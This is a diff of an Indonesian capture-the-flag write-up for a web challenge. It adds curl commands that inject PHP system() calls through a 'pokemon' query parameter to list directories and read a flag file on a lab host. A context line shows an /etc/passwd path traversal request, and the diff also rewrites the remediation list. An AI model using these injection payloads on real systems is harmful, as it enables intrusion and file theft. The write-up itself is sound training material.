@@ -489,18 +489,29 @@ GET /?pokemon=../../../../etc/passwd
   <img width="1535" height="733" alt="image" src="https://github.com/user-attachments/assets/d5141405-5843-4f6a-8665-90523d1aac7e" />
   </li>
 
-  <li>
+  <li> 
     <p><strong>Remode Code Execution:</strong> Kita dapat memasukan kode seperti ini dan hasilnya seperti ini.</p>
 
     <img width="1541" height="741" alt="image" src="https://github.com/user-attachments/assets/ba804dda-10d9-44ac-a587-9757f8e41dc8" />
 <p>Lalu, kita dapat memasukkan command lain selain id, misalnya seperti ini.</p>
 
+<pre>
+curl -s "http://10.15.42.23:5001/?pokemon='.system('ls+-la').'"
+  
+curl -s "http://10.15.42.23:5001/?pokemon='.system('ls+-la+/home/user/').'"
+  
+curl -s "http://10.15.42.23:5001/?pokemon='.system('cat+/home/user/user_Vi4Wgk6yhFXuymQJqNJ3xVwMcDJzzzDeA03jx58Z.txt').'"
+
+</pre>
 <img width="766" height="292" alt="image" src="https://github.com/user-attachments/assets/a88a90bf-8f32-49d2-a790-4dd5f70c3568" />
 
 <img width="842" height="694" alt="image" src="https://github.com/user-attachments/assets/cf82ff8e-4811-4ee7-981d-16f0d10b2a1a" />
 
 <img width="880" height="337" alt="image" src="https://github.com/user-attachments/assets/c6de6536-9d15-4c11-b58d-8446b9d04e64" />
-
+</li>
+    <li>
+    <p><strong>Remode Code Execution:</strong> Kita dapat memasukan kode seperti ini dan hasilnya seperti ini.</p>
+      
 <img width="946" height="202" alt="image" src="https://github.com/user-attachments/assets/190fdf1d-2803-40a9-909f-4e2c2bf8b251" />
 
 <p>Sehingga sebuah flag ditemukan, yaitu
@@ -530,14 +541,13 @@ GET /?pokemon=../../../../etc/passwd
 </h3>
 <ol>
   <li>
-    <p>Saat mengekstrak file ZIP, validasi setiap entry. Jangan izinkan ekstraksi file tipe <em>Symbolic Link</em>.
-    </p>
+Validasi Input yang Ketat
   </li>
-  
   <li>
-    <p>
-      Pastikan jalur ekstraksi file (<code>canonical path</code>) tetap berada di dalam direktori tujuan yang diizinkan (mencegah Path Traversal).
-    </p>
+     Implementasi Least Privilege
   </li>
-  </ol>
+  <li>Jalankan web server sebagai user khusus dengan hak minimal</li>
+  <li>Restrict directory permissions </li>
+  <li>Gunakan chroot atau containerization</li>
+</ol>
   </div>
